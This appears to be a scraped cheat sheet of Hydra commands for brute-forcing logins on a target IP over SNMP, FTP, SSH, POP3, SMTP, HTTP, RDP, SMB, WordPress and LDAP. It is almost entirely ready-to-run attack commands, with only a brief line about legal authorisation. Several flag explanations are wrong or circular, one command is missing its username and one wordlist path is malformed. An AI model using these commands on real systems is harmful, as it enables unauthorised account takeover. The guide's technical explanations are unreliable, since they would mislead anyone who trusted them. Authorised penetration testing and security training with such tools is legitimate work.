Hydra Password Cracking Step-by-Step Guide
Introduction:
Hydra is a powerful password-cracking tool that supports various protocols. This guide provides step-by-step instructions for using Hydra in different scenarios. Always ensure you have legal authorization before attempting any password-cracking activities.

Prerequisites:
Install Hydra:
Use your system's package manager or download from Hydra's official website.
Set Target IP:
bash
Copy code
export ip=10.10.10.1
Replace 10.10.10.1 with the target IP address.

Commands:
1. SNMP Brute Force:
bash
Copy code
hydra -P password-file.txt -v $ip snmp
Description:
This command performs a brute-force attack against the SNMP protocol using a password file.
Parameters:
-P password-file.txt: Specify the password file.
-v: Verbose output.
$ip snmp: Target IP and protocol (SNMP).
Usage:
Replace password-file.txt with your password file.
2. FTP Brute Force with Known User and RockYou Password List:
bash
Copy code
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
Description:
This command performs a brute-force attack against FTP using a known username and the RockYou password list.
Parameters:
-t 1: Use one thread.
-l admin: Target username.
-P /usr/share/wordlists/rockyou.txt: Password file.
-vV: Verbose output with version info.
$ip ftp: Target IP and protocol (FTP).
Usage:
Replace admin with your target username.
3. SSH Brute Force with User and Password Lists:
bash
Copy code
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
Description:
This command performs a brute-force attack against SSH using a list of usernames and passwords.
Parameters:
-u: Use usernames.
-L users.txt: Usernames file.
-P passwords.txt: Password file.
-t 1: Use one thread.
-v -V: Verbose output.
$ip ssh: Target IP and protocol (SSH).
Usage:
Replace users.txt and passwords.txt with your respective files.
4. SSH Brute Force with Known Password and User List:
bash
Copy code
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh
Description:
This command performs a brute-force attack against SSH using a known password and a list of usernames.
Parameters:
-p "": Known password (blank).
Other options are similar to SSH.
5. SSH Brute Force Against Known Username on Port 22:
bash
Copy code
hydra $ip -s 22 ssh -l -P big_wordlist.txt
Description:
This command performs a brute-force attack against SSH targeting a known username on port 22.
Parameters:
-s 22: Port number.
-l: Userlist mode.
-P big_wordlist.txt: Password file.
Usage:
Replace big_wordlist.txt with your password file.
6. POP3 Brute Force:
bash
Copy code
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
Description:
This command performs a brute-force attack against POP3 using a specific username and a password list.
Parameters:
-l USERNAME: Target username.
-P /usr/share/wordlistsnmap.lst: Password file.
-f: Stop on first valid password.
$ip pop3: Target IP and protocol (POP3).
Usage:
Replace USERNAME with your target username.
7. SMTP Brute Force:
bash
Copy code
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
Description:
This command performs a brute-force attack against SMTP using a password list.
Parameters:
$ip smtp: Target IP and protocol (SMTP).
8. HTTP GET Brute Force for Admin Login:
bash
Copy code
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
Description:
This command performs a brute-force attack against an HTTP login page using a list of usernames and passwords.
Parameters:
-L ./webapp.txt: Usernames file.
-P ./webapp.txt: Password file.
$ip http-get /admin: Target IP, protocol (HTTP), and login URL.
Usage:
Replace ./webapp.txt with your usernames and passwords files.
9. Windows Remote Desktop (RDP) Brute Force with RockYou:
bash
Copy code
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
Description:
This command performs a brute-force attack against Windows Remote Desktop (RDP) using a known username and the RockYou password list.
Parameters:
Options similar to RDP command.
Usage:
Replace administrator with your target username.
10. SMB Brute Force with RockYou:
bash
Copy code
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
Description:
This command performs a brute-force attack against SMB using a known username and the RockYou password list.
Parameters:
Options similar to SMB command.
11. WordPress Admin Login Brute Force:
bash
Copy code
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
Description:
This command performs a brute-force attack against WordPress admin login using a specific username and a password list.
Parameters:
Options for WordPress login.
Usage:
Replace admin with your target username and ./passwordlist.txt with your password file.
12. SMB Brute Forcing with Usernames and Passwords:
bash
Copy code
hydra -L usernames.txt -P passwords.txt $ip smb -V -f
Description:
This command performs a brute-force attack against SMB using a list of usernames and passwords.
Parameters:
Options for SMB.
Usage:
Replace usernames.txt and passwords.txt with your respective files.
13. LDAP Brute Forcing:
bash
Copy code
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f
Description:
This command performs a brute-force attack against LDAP using a list of usernames and passwords.
Parameters:
Options for LDAP.
Usage:
Replace users.txt and passwords.txt with your respective files.
This guide provides detailed instructions for each Hydra command. Customize the parameters based on your specific requirements and ensure compliance with legal and ethical standards.





